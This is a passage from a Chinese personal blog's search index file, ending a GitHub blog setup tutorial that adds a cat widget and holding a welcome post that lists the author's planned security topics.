模型透明度</span><br></code></pre></td></tr></table></figure><p>添加到文件末尾即可：</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-10-54.png"></p><p>然后你就成功拥有一只小猫啦！</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-19-57.png"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客简介</title>
    <link href="/2022/12/08/Hello!/"/>
    <url>/2022/12/08/Hello!/</url>
    
    <content type="html"><![CDATA[<h2 id="欢迎来到3xsh0re的博客"><a href="#欢迎来到3xsh0re的博客" class="headerlink" title="欢迎来到3xsh0re的博客"></a>欢迎来到3xsh0re的博客</h2><span id="more"></span><p>在这里，我会更新渗透测试、SRC挖掘、web安全、逆向分析、二进制安全的一些内容，希望自己可以持之以恒的学习下去👍</p><p><img src="/2022/12/08/Hello!/Pikachu.png"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>简介</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
